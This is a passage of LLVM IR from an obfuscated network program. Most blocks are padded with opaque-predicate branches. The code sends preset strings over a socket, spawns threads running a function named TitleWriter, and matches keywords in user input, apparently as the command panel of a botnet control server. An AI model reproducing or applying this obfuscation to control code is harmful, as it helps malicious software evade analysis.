  %866 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %867 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i32 0, i32 0
  %868 = call i64 @strlen(i8* %867) #8
  %869 = call i64 @send(i32 %865, i8* %866, i64 %868, i32 16384)
  %870 = icmp eq i64 %869, -1
  br i1 %870, label %871, label %888

; <label>:871:                                    ; preds = %864
  %872 = load i32, i32* @x.15
  %873 = load i32, i32* @y.16
  %874 = sub i32 %872, 1
  %875 = mul i32 %872, %874
  %876 = urem i32 %875, 2
  %877 = icmp eq i32 %876, 0
  %878 = icmp slt i32 %873, 10
  %879 = or i1 %877, %878
  br i1 %879, label %originalBB113, label %originalBB113alteredBB

originalBB113:                                    ; preds = %originalBB113alteredBB, %871
  %880 = load i32, i32* @x.15
  %881 = load i32, i32* @y.16
  %882 = sub i32 %880, 1
  %883 = mul i32 %880, %882
  %884 = urem i32 %883, 2
  %885 = icmp eq i32 %884, 0
  %886 = icmp slt i32 %881, 10
  %887 = or i1 %885, %886
  br i1 %887, label %originalBBpart2115, label %originalBB113alteredBB

originalBBpart2115:                               ; preds = %originalBB113
  br label %1831

; <label>:888:                                    ; preds = %864
  %889 = load i32, i32* %12, align 4
  %890 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %891 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i32 0, i32 0
  %892 = call i64 @strlen(i8* %891) #8
  %893 = call i64 @send(i32 %889, i8* %890, i64 %892, i32 16384)
  %894 = icmp eq i64 %893, -1
  br i1 %894, label %895, label %896

; <label>:895:                                    ; preds = %888
  br label %1831

; <label>:896:                                    ; preds = %888
  %897 = load i32, i32* %12, align 4
  %898 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %899 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i32 0, i32 0
  %900 = call i64 @strlen(i8* %899) #8
  %901 = call i64 @send(i32 %897, i8* %898, i64 %900, i32 16384)
  %902 = icmp eq i64 %901, -1
  br i1 %902, label %903, label %904

; <label>:903:                                    ; preds = %896
  br label %1831

; <label>:904:                                    ; preds = %896
  %905 = load i32, i32* %12, align 4
  %906 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %907 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i32 0, i32 0
  %908 = call i64 @strlen(i8* %907) #8
  %909 = call i64 @send(i32 %905, i8* %906, i64 %908, i32 16384)
  %910 = icmp eq i64 %909, -1
  br i1 %910, label %911, label %928

; <label>:911:                                    ; preds = %904
  %912 = load i32, i32* @x.15
  %913 = load i32, i32* @y.16
  %914 = sub i32 %912, 1
  %915 = mul i32 %912, %914
  %916 = urem i32 %915, 2
  %917 = icmp eq i32 %916, 0
  %918 = icmp slt i32 %913, 10
  %919 = or i1 %917, %918
  br i1 %919, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %911
  %920 = load i32, i32* @x.15
  %921 = load i32, i32* @y.16
  %922 = sub i32 %920, 1
  %923 = mul i32 %920, %922
  %924 = urem i32 %923, 2
  %925 = icmp eq i32 %924, 0
  %926 = icmp slt i32 %921, 10
  %927 = or i1 %925, %926
  br i1 %927, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br label %1831

; <label>:928:                                    ; preds = %904
  %929 = load i32, i32* @x.15
  %930 = load i32, i32* @y.16
  %931 = sub i32 %929, 1
  %932 = mul i32 %929, %931
  %933 = urem i32 %932, 2
  %934 = icmp eq i32 %933, 0
  %935 = icmp slt i32 %930, 10
  %936 = or i1 %934, %935
  br i1 %936, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %928
  %937 = load i32, i32* %12, align 4
  %938 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %939 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i32 0, i32 0
  %940 = call i64 @strlen(i8* %939) #8
  %941 = call i64 @send(i32 %937, i8* %938, i64 %940, i32 16384)
  %942 = icmp eq i64 %941, -1
  %943 = load i32, i32* @x.15
  %944 = load i32, i32* @y.16
  %945 = sub i32 %943, 1
  %946 = mul i32 %943, %945
  %947 = urem i32 %946, 2
  %948 = icmp eq i32 %947, 0
  %949 = icmp slt i32 %944, 10
  %950 = or i1 %948, %949
  br i1 %950, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br i1 %942, label %951, label %968

; <label>:951:                                    ; preds = %originalBBpart2123
  %952 = load i32, i32* @x.15
  %953 = load i32, i32* @y.16
  %954 = sub i32 %952, 1
  %955 = mul i32 %952, %954
  %956 = urem i32 %955, 2
  %957 = icmp eq i32 %956, 0
  %958 = icmp slt i32 %953, 10
  %959 = or i1 %957, %958
  br i1 %959, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %951
  %960 = load i32, i32* @x.15
  %961 = load i32, i32* @y.16
  %962 = sub i32 %960, 1
  %963 = mul i32 %960, %962
  %964 = urem i32 %963, 2
  %965 = icmp eq i32 %964, 0
  %966 = icmp slt i32 %961, 10
  %967 = or i1 %965, %966
  br i1 %967, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br label %1831

; <label>:968:                                    ; preds = %originalBBpart2123
  %969 = load i32, i32* @x.15
  %970 = load i32, i32* @y.16
  %971 = sub i32 %969, 1
  %972 = mul i32 %969, %971
  %973 = urem i32 %972, 2
  %974 = icmp eq i32 %973, 0
  %975 = icmp slt i32 %970, 10
  %976 = or i1 %974, %975
  br i1 %976, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %968
  %977 = load i32, i32* %12, align 4
  %978 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %979 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i32 0, i32 0
  %980 = call i64 @strlen(i8* %979) #8
  %981 = call i64 @send(i32 %977, i8* %978, i64 %980, i32 16384)
  %982 = icmp eq i64 %981, -1
  %983 = load i32, i32* @x.15
  %984 = load i32, i32* @y.16
  %985 = sub i32 %983, 1
  %986 = mul i32 %983, %985
  %987 = urem i32 %986, 2
  %988 = icmp eq i32 %987, 0
  %989 = icmp slt i32 %984, 10
  %990 = or i1 %988, %989
  br i1 %990, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br i1 %982, label %991, label %1008

; <label>:991:                                    ; preds = %originalBBpart2131
  %992 = load i32, i32* @x.15
  %993 = load i32, i32* @y.16
  %994 = sub i32 %992, 1
  %995 = mul i32 %992, %994
  %996 = urem i32 %995, 2
  %997 = icmp eq i32 %996, 0
  %998 = icmp slt i32 %993, 10
  %999 = or i1 %997, %998
  br i1 %999, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %991
  %1000 = load i32, i32* @x.15
  %1001 = load i32, i32* @y.16
  %1002 = sub i32 %1000, 1
  %1003 = mul i32 %1000, %1002
  %1004 = urem i32 %1003, 2
  %1005 = icmp eq i32 %1004, 0
  %1006 = icmp slt i32 %1001, 10
  %1007 = or i1 %1005, %1006
  br i1 %1007, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br label %1831

; <label>:1008:                                   ; preds = %originalBBpart2131
  %1009 = load i32, i32* %12, align 4
  %1010 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %1011 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i32 0, i32 0
  %1012 = call i64 @strlen(i8* %1011) #8
  %1013 = call i64 @send(i32 %1009, i8* %1010, i64 %1012, i32 16384)
  %1014 = icmp eq i64 %1013, -1
  br i1 %1014, label %1015, label %1016

; <label>:1015:                                   ; preds = %1008
  br label %1831

; <label>:1016:                                   ; preds = %1008
  %1017 = load i32, i32* @x.15
  %1018 = load i32, i32* @y.16
  %1019 = sub i32 %1017, 1
  %1020 = mul i32 %1017, %1019
  %1021 = urem i32 %1020, 2
  %1022 = icmp eq i32 %1021, 0
  %1023 = icmp slt i32 %1018, 10
  %1024 = or i1 %1022, %1023
  br i1 %1024, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %1016
  %1025 = load i32, i32* %12, align 4
  %1026 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %1027 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i32 0, i32 0
  %1028 = call i64 @strlen(i8* %1027) #8
  %1029 = call i64 @send(i32 %1025, i8* %1026, i64 %1028, i32 16384)
  %1030 = icmp eq i64 %1029, -1
  %1031 = load i32, i32* @x.15
  %1032 = load i32, i32* @y.16
  %1033 = sub i32 %1031, 1
  %1034 = mul i32 %1031, %1033
  %1035 = urem i32 %1034, 2
  %1036 = icmp eq i32 %1035, 0
  %1037 = icmp slt i32 %1032, 10
  %1038 = or i1 %1036, %1037
  br i1 %1038, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br i1 %1030, label %1039, label %1056

; <label>:1039:                                   ; preds = %originalBBpart2139
  %1040 = load i32, i32* @x.15
  %1041 = load i32, i32* @y.16
  %1042 = sub i32 %1040, 1
  %1043 = mul i32 %1040, %1042
  %1044 = urem i32 %1043, 2
  %1045 = icmp eq i32 %1044, 0
  %1046 = icmp slt i32 %1041, 10
  %1047 = or i1 %1045, %1046
  br i1 %1047, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %1039
  %1048 = load i32, i32* @x.15
  %1049 = load i32, i32* @y.16
  %1050 = sub i32 %1048, 1
  %1051 = mul i32 %1048, %1050
  %1052 = urem i32 %1051, 2
  %1053 = icmp eq i32 %1052, 0
  %1054 = icmp slt i32 %1049, 10
  %1055 = or i1 %1053, %1054
  br i1 %1055, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br label %1831

; <label>:1056:                                   ; preds = %originalBBpart2139
  %1057 = load i32, i32* @x.15
  %1058 = load i32, i32* @y.16
  %1059 = sub i32 %1057, 1
  %1060 = mul i32 %1057, %1059
  %1061 = urem i32 %1060, 2
  %1062 = icmp eq i32 %1061, 0
  %1063 = icmp slt i32 %1058, 10
  %1064 = or i1 %1062, %1063
  br i1 %1064, label %originalBB145, label %originalBB145alteredBB

originalBB145:                                    ; preds = %originalBB145alteredBB, %1056
  %1065 = load i32, i32* %12, align 4
  %1066 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %1067 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i32 0, i32 0
  %1068 = call i64 @strlen(i8* %1067) #8
  %1069 = call i64 @send(i32 %1065, i8* %1066, i64 %1068, i32 16384)
  %1070 = icmp eq i64 %1069, -1
  %1071 = load i32, i32* @x.15
  %1072 = load i32, i32* @y.16
  %1073 = sub i32 %1071, 1
  %1074 = mul i32 %1071, %1073
  %1075 = urem i32 %1074, 2
  %1076 = icmp eq i32 %1075, 0
  %1077 = icmp slt i32 %1072, 10
  %1078 = or i1 %1076, %1077
  br i1 %1078, label %originalBBpart2147, label %originalBB145alteredBB

originalBBpart2147:                               ; preds = %originalBB145
  br i1 %1070, label %1079, label %1080

; <label>:1079:                                   ; preds = %originalBBpart2147
  br label %1831

; <label>:1080:                                   ; preds = %originalBBpart2147
  %1081 = load i32, i32* %12, align 4
  %1082 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %1083 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i32 0, i32 0
  %1084 = call i64 @strlen(i8* %1083) #8
  %1085 = call i64 @send(i32 %1081, i8* %1082, i64 %1084, i32 16384)
  %1086 = icmp eq i64 %1085, -1
  br i1 %1086, label %1087, label %1104

; <label>:1087:                                   ; preds = %1080
  %1088 = load i32, i32* @x.15
  %1089 = load i32, i32* @y.16
  %1090 = sub i32 %1088, 1
  %1091 = mul i32 %1088, %1090
  %1092 = urem i32 %1091, 2
  %1093 = icmp eq i32 %1092, 0
  %1094 = icmp slt i32 %1089, 10
  %1095 = or i1 %1093, %1094
  br i1 %1095, label %originalBB149, label %originalBB149alteredBB

originalBB149:                                    ; preds = %originalBB149alteredBB, %1087
  %1096 = load i32, i32* @x.15
  %1097 = load i32, i32* @y.16
  %1098 = sub i32 %1096, 1
  %1099 = mul i32 %1096, %1098
  %1100 = urem i32 %1099, 2
  %1101 = icmp eq i32 %1100, 0
  %1102 = icmp slt i32 %1097, 10
  %1103 = or i1 %1101, %1102
  br i1 %1103, label %originalBBpart2151, label %originalBB149alteredBB

originalBBpart2151:                               ; preds = %originalBB149
  br label %1831

; <label>:1104:                                   ; preds = %1080
  %1105 = load i32, i32* %12, align 4
  %1106 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %1107 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i32 0, i32 0
  %1108 = call i64 @strlen(i8* %1107) #8
  %1109 = call i64 @send(i32 %1105, i8* %1106, i64 %1108, i32 16384)
  %1110 = icmp eq i64 %1109, -1
  br i1 %1110, label %1111, label %1128

; <label>:1111:                                   ; preds = %1104
  %1112 = load i32, i32* @x.15
  %1113 = load i32, i32* @y.16
  %1114 = sub i32 %1112, 1
  %1115 = mul i32 %1112, %1114
  %1116 = urem i32 %1115, 2
  %1117 = icmp eq i32 %1116, 0
  %1118 = icmp slt i32 %1113, 10
  %1119 = or i1 %1117, %1118
  br i1 %1119, label %originalBB153, label %originalBB153alteredBB

originalBB153:                                    ; preds = %originalBB153alteredBB, %1111
  %1120 = load i32, i32* @x.15
  %1121 = load i32, i32* @y.16
  %1122 = sub i32 %1120, 1
  %1123 = mul i32 %1120, %1122
  %1124 = urem i32 %1123, 2
  %1125 = icmp eq i32 %1124, 0
  %1126 = icmp slt i32 %1121, 10
  %1127 = or i1 %1125, %1126
  br i1 %1127, label %originalBBpart2155, label %originalBB153alteredBB

originalBBpart2155:                               ; preds = %originalBB153
  br label %1831

; <label>:1128:                                   ; preds = %1104
  %1129 = load i32, i32* %12, align 4
  %1130 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %1131 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i32 0, i32 0
  %1132 = call i64 @strlen(i8* %1131) #8
  %1133 = call i64 @send(i32 %1129, i8* %1130, i64 %1132, i32 16384)
  %1134 = icmp eq i64 %1133, -1
  br i1 %1134, label %1135, label %1136

; <label>:1135:                                   ; preds = %1128
  br label %1831

; <label>:1136:                                   ; preds = %1128
  %1137 = load i32, i32* %12, align 4
  %1138 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %1139 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i32 0, i32 0
  %1140 = call i64 @strlen(i8* %1139) #8
  %1141 = call i64 @send(i32 %1137, i8* %1138, i64 %1140, i32 16384)
  %1142 = icmp eq i64 %1141, -1
  br i1 %1142, label %1143, label %1144

; <label>:1143:                                   ; preds = %1136
  br label %1831

; <label>:1144:                                   ; preds = %1136
  %1145 = load i32, i32* %12, align 4
  %1146 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i32 0, i32 0
  %1147 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i32 0, i32 0
  %1148 = call i64 @strlen(i8* %1147) #8
  %1149 = call i64 @send(i32 %1145, i8* %1146, i64 %1148, i32 16384)
  %1150 = icmp eq i64 %1149, -1
  br i1 %1150, label %1151, label %1168

; <label>:1151:                                   ; preds = %1144
  %1152 = load i32, i32* @x.15
  %1153 = load i32, i32* @y.16
  %1154 = sub i32 %1152, 1
  %1155 = mul i32 %1152, %1154
  %1156 = urem i32 %1155, 2
  %1157 = icmp eq i32 %1156, 0
  %1158 = icmp slt i32 %1153, 10
  %1159 = or i1 %1157, %1158
  br i1 %1159, label %originalBB157, label %originalBB157alteredBB

originalBB157:                                    ; preds = %originalBB157alteredBB, %1151
  %1160 = load i32, i32* @x.15
  %1161 = load i32, i32* @y.16
  %1162 = sub i32 %1160, 1
  %1163 = mul i32 %1160, %1162
  %1164 = urem i32 %1163, 2
  %1165 = icmp eq i32 %1164, 0
  %1166 = icmp slt i32 %1161, 10
  %1167 = or i1 %1165, %1166
  br i1 %1167, label %originalBBpart2159, label %originalBB157alteredBB

originalBBpart2159:                               ; preds = %originalBB157
  br label %1831

; <label>:1168:                                   ; preds = %1144
  %1169 = load i32, i32* %12, align 4
  %1170 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %1171 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i32 0, i32 0
  %1172 = call i64 @strlen(i8* %1171) #8
  %1173 = call i64 @send(i32 %1169, i8* %1170, i64 %1172, i32 16384)
  %1174 = icmp eq i64 %1173, -1
  br i1 %1174, label %1175, label %1176

; <label>:1175:                                   ; preds = %1168
  br label %1831

; <label>:1176:                                   ; preds = %1168
  %1177 = load i8*, i8** %11, align 8
  %1178 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1177) #7
  %1179 = load i32, i32* %12, align 4
  %1180 = call i64 @send(i32 %1179, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %1181 = icmp eq i64 %1180, -1
  br i1 %1181, label %1182, label %1183

; <label>:1182:                                   ; preds = %1176
  br label %1831

; <label>:1183:                                   ; preds = %1176
  br label %642

; <label>:1184:                                   ; preds = %originalBBpart299
  %1185 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1186 = call i8* @strstr(i8* %1185, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.57, i32 0, i32 0)) #8
  %1187 = icmp ne i8* %1186, null
  br i1 %1187, label %1188, label %1328

; <label>:1188:                                   ; preds = %1184
  %1189 = load i8*, i8** %11, align 8
  %1190 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1189) #7
  %1191 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i32 0, i32 0
  %1192 = call i32 (i8*, i8*, ...) @sprintf(i8* %1191, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.58, i32 0, i32 0)) #7
  %1193 = getelementptr inbounds [80 x i8], [80 x i8]* %56, i32 0, i32 0
  %1194 = call i32 (i8*, i8*, ...) @sprintf(i8* %1193, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.59, i32 0, i32 0)) #7
  %1195 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i32 0, i32 0
  %1196 = call i32 (i8*, i8*, ...) @sprintf(i8* %1195, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.60, i32 0, i32 0)) #7
  %1197 = getelementptr inbounds [80 x i8], [80 x i8]* %58, i32 0, i32 0
  %1198 = call i32 (i8*, i8*, ...) @sprintf(i8* %1197, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.61, i32 0, i32 0)) #7
  %1199 = getelementptr inbounds [80 x i8], [80 x i8]* %59, i32 0, i32 0
  %1200 = call i32 (i8*, i8*, ...) @sprintf(i8* %1199, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.62, i32 0, i32 0)) #7
  %1201 = load i32, i32* %12, align 4
  %1202 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i32 0, i32 0
  %1203 = getelementptr inbounds [80 x i8], [80 x i8]* %55, i32 0, i32 0
  %1204 = call i64 @strlen(i8* %1203) #8
  %1205 = call i64 @send(i32 %1201, i8* %1202, i64 %1204, i32 16384)
  %1206 = icmp eq i64 %1205, -1
  br i1 %1206, label %1207, label %1224

; <label>:1207:                                   ; preds = %1188
  %1208 = load i32, i32* @x.15
  %1209 = load i32, i32* @y.16
  %1210 = sub i32 %1208, 1
  %1211 = mul i32 %1208, %1210
  %1212 = urem i32 %1211, 2
  %1213 = icmp eq i32 %1212, 0
  %1214 = icmp slt i32 %1209, 10
  %1215 = or i1 %1213, %1214
  br i1 %1215, label %originalBB161, label %originalBB161alteredBB

originalBB161:                                    ; preds = %originalBB161alteredBB, %1207
  %1216 = load i32, i32* @x.15
  %1217 = load i32, i32* @y.16
  %1218 = sub i32 %1216, 1
  %1219 = mul i32 %1216, %1218
  %1220 = urem i32 %1219, 2
  %1221 = icmp eq i32 %1220, 0
  %1222 = icmp slt i32 %1217, 10
  %1223 = or i1 %1221, %1222
  br i1 %1223, label %originalBBpart2163, label %originalBB161alteredBB

originalBBpart2163:                               ; preds = %originalBB161
  br label %1831

; <label>:1224:                                   ; preds = %1188
  %1225 = load i32, i32* @x.15
  %1226 = load i32, i32* @y.16
  %1227 = sub i32 %1225, 1
  %1228 = mul i32 %1225, %1227
  %1229 = urem i32 %1228, 2
  %1230 = icmp eq i32 %1229, 0
  %1231 = icmp slt i32 %1226, 10
  %1232 = or i1 %1230, %1231
  br i1 %1232, label %originalBB165, label %originalBB165alteredBB

originalBB165:                                    ; preds = %originalBB165alteredBB, %1224
  %1233 = load i32, i32* %12, align 4
  %1234 = getelementptr inbounds [80 x i8], [80 x i8]* %56, i32 0, i32 0
  %1235 = getelementptr inbounds [80 x i8], [80 x i8]* %56, i32 0, i32 0
  %1236 = call i64 @strlen(i8* %1235) #8
  %1237 = call i64 @send(i32 %1233, i8* %1234, i64 %1236, i32 16384)
  %1238 = icmp eq i64 %1237, -1
  %1239 = load i32, i32* @x.15
  %1240 = load i32, i32* @y.16
  %1241 = sub i32 %1239, 1
  %1242 = mul i32 %1239, %1241
  %1243 = urem i32 %1242, 2
  %1244 = icmp eq i32 %1243, 0
  %1245 = icmp slt i32 %1240, 10
  %1246 = or i1 %1244, %1245
  br i1 %1246, label %originalBBpart2167, label %originalBB165alteredBB

originalBBpart2167:                               ; preds = %originalBB165
  br i1 %1238, label %1247, label %1248

; <label>:1247:                                   ; preds = %originalBBpart2167
  br label %1831

; <label>:1248:                                   ; preds = %originalBBpart2167
  %1249 = load i32, i32* @x.15
  %1250 = load i32, i32* @y.16
  %1251 = sub i32 %1249, 1
  %1252 = mul i32 %1249, %1251
  %1253 = urem i32 %1252, 2
  %1254 = icmp eq i32 %1253, 0
  %1255 = icmp slt i32 %1250, 10
  %1256 = or i1 %1254, %1255
  br i1 %1256, label %originalBB169, label %originalBB169alteredBB

originalBB169:                                    ; preds = %originalBB169alteredBB, %1248
  %1257 = load i32, i32* %12, align 4
  %1258 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i32 0, i32 0
  %1259 = getelementptr inbounds [80 x i8], [80 x i8]* %57, i32 0, i32 0
  %1260 = call i64 @strlen(i8* %1259) #8
  %1261 = call i64 @send(i32 %1257, i8* %1258, i64 %1260, i32 16384)
  %1262 = icmp eq i64 %1261, -1
  %1263 = load i32, i32* @x.15
  %1264 = load i32, i32* @y.16
  %1265 = sub i32 %1263, 1
  %1266 = mul i32 %1263, %1265
  %1267 = urem i32 %1266, 2
  %1268 = icmp eq i32 %1267, 0
  %1269 = icmp slt i32 %1264, 10
  %1270 = or i1 %1268, %1269
  br i1 %1270, label %originalBBpart2171, label %originalBB169alteredBB

originalBBpart2171:                               ; preds = %originalBB169
  br i1 %1262, label %1271, label %1272

; <label>:1271:                                   ; preds = %originalBBpart2171
  br label %1831

; <label>:1272:                                   ; preds = %originalBBpart2171
  %1273 = load i32, i32* @x.15
  %1274 = load i32, i32* @y.16
  %1275 = sub i32 %1273, 1
  %1276 = mul i32 %1273, %1275
  %1277 = urem i32 %1276, 2
  %1278 = icmp eq i32 %1277, 0
  %1279 = icmp slt i32 %1274, 10
  %1280 = or i1 %1278, %1279
  br i1 %1280, label %originalBB173, label %originalBB173alteredBB

originalBB173:                                    ; preds = %originalBB173alteredBB, %1272
  %1281 = load i32, i32* %12, align 4
  %1282 = getelementptr inbounds [80 x i8], [80 x i8]* %58, i32 0, i32 0
  %1283 = getelementptr inbounds [80 x i8], [80 x i8]* %58, i32 0, i32 0
  %1284 = call i64 @strlen(i8* %1283) #8
  %1285 = call i64 @send(i32 %1281, i8* %1282, i64 %1284, i32 16384)
  %1286 = icmp eq i64 %1285, -1
  %1287 = load i32, i32* @x.15
  %1288 = load i32, i32* @y.16
  %1289 = sub i32 %1287, 1
  %1290 = mul i32 %1287, %1289
  %1291 = urem i32 %1290, 2
  %1292 = icmp eq i32 %1291, 0
  %1293 = icmp slt i32 %1288, 10
  %1294 = or i1 %1292, %1293
  br i1 %1294, label %originalBBpart2175, label %originalBB173alteredBB

originalBBpart2175:                               ; preds = %originalBB173
  br i1 %1286, label %1295, label %1312

; <label>:1295:                                   ; preds = %originalBBpart2175
  %1296 = load i32, i32* @x.15
  %1297 = load i32, i32* @y.16
  %1298 = sub i32 %1296, 1
  %1299 = mul i32 %1296, %1298
  %1300 = urem i32 %1299, 2
  %1301 = icmp eq i32 %1300, 0
  %1302 = icmp slt i32 %1297, 10
  %1303 = or i1 %1301, %1302
  br i1 %1303, label %originalBB177, label %originalBB177alteredBB

originalBB177:                                    ; preds = %originalBB177alteredBB, %1295
  %1304 = load i32, i32* @x.15
  %1305 = load i32, i32* @y.16
  %1306 = sub i32 %1304, 1
  %1307 = mul i32 %1304, %1306
  %1308 = urem i32 %1307, 2
  %1309 = icmp eq i32 %1308, 0
  %1310 = icmp slt i32 %1305, 10
  %1311 = or i1 %1309, %1310
  br i1 %1311, label %originalBBpart2179, label %originalBB177alteredBB

originalBBpart2179:                               ; preds = %originalBB177
  br label %1831

; <label>:1312:                                   ; preds = %originalBBpart2175
  %1313 = load i32, i32* %12, align 4
  %1314 = getelementptr inbounds [80 x i8], [80 x i8]* %59, i32 0, i32 0
  %1315 = getelementptr inbounds [80 x i8], [80 x i8]* %59, i32 0, i32 0
  %1316 = call i64 @strlen(i8* %1315) #8
  %1317 = call i64 @send(i32 %1313, i8* %1314, i64 %1316, i32 16384)
  %1318 = icmp eq i64 %1317, -1
  br i1 %1318, label %1319, label %1320

; <label>:1319:                                   ; preds = %1312
  br label %1831

; <label>:1320:                                   ; preds = %1312
  %1321 = load i8*, i8** %11, align 8
  %1322 = call i32 @pthread_create(i64* %14, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %1321) #7
  %1323 = load i32, i32* %12, align 4
  %1324 = call i64 @send(i32 %1323, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i64 12, i32 16384)
  %1325 = icmp eq i64 %1324, -1
  br i1 %1325, label %1326, label %1327

; <label>:1326:                                   ; preds = %1320
  br label %1831

; <label>:1327:                                   ; preds = %1320
  br label %642

; <label>:1328:                                   ; preds = %1184
  %1329 = load i32, i32* @x.15
  %1330 = load i32, i32* @y.16
  %1331 = sub i32 %1329, 1
  %1332 = mul i32 %1329, %1331
  %1333 = urem i32 %1332, 2
  %1334 = icmp eq i32 %1333, 0
  %1335 = icmp slt i32 %1330, 10
  %1336 = or i1 %1334, %1335
  br i1 %1336, label %originalBB181, label %originalBB181alteredBB

originalBB181:                                    ; preds = %originalBB181alteredBB, %1328
  %1337 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i32 0, i32 0
  %1338 = call i8* @strstr(i8* %1337, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0)) #8
  %1339 = icmp ne i8* %1338, null
  %1340 = load i32, i32* @x.15
  %1341 = load i32, i32* @y.16
  %1342 = sub i32 %1340, 1
  %1343 = mul i32 %1340, %1342
  %1344 = urem i32 %1343, 2
  %1345 = icmp eq i32 %1344, 0
  %1346 = icmp slt i32 %1341, 10
  %1347 = or i1 %1345, %1346
  br i1 %1347, label %originalBBpart2183, label %originalBB181alteredBB

originalBBpart2183:                               ; preds = %originalBB181
  br i1 %1339, label %1348, label %1397

; <label>:1348:                                   ; preds = %originalBBpart2183
  %1349 = getelementptr inbounds [2048 x i8], [2048 x i8]* %60, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %1349, i8 0, i64 2048, i32 16, i1 false)
  %1350 = getelementptr inbounds [2048 x i8], [2048 x i8]* %60, i32 0, i32 0
  %1351 = call i32 (i8*, i8*, ...) @sprintf(i8* %1350, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.64, i32 0, i32 0)) #7
  %1352 = load i32, i32* %12, align 4
  %1353 = getelementptr inbounds [2048 x i8], [2048 x i8]* %60, i32 0, i32 0
  %1354 = getelementptr inbounds [2048 x i8], [2048 x i8]* %60, i32 0, i32 0
  %1355 = call i64 @strlen(i8* %1354) #8
  %1356 = call i64 @send(i32 %1352, i8* %1353, i64 %1355, i32 16384)
  %1357 = icmp eq i64 %1356, -1
  br i1 %1357, label %1358, label %1375

; <label>:1358:                                   ; preds = %1348
  %1359 = load i32, i32* @x.15
  %1360 = load i32, i32* @y.16
  %1361 = sub i32 %1359, 1
  %1362 = mul i32 %1359, %1361
  %1363 = urem i32 %1362, 2
  %1364 = icmp eq i32 %1363, 0
  %1365 = icmp slt i32 %1360, 10
  %1366 = or i1 %1364, %1365
  br i1 %1366, label %originalBB185, label %originalBB185alteredBB

originalBB185:                                    ; preds = %originalBB185alteredBB, %1358
  %1367 = load i32, i32* @x.15
  %1368 = load i32, i32* @y.16
  %1369 = sub i32 %1367, 1
  %1370 = mul i32 %1367, %1369
  %1371 = urem i32 %1370, 2
  %1372 = icmp eq i32 %1371, 0
  %1373 = icmp slt i32 %1368, 10
  %1374 = or i1 %1372, %1373
  br i1 %1374, label %originalBBpart2187, label %originalBB185alteredBB

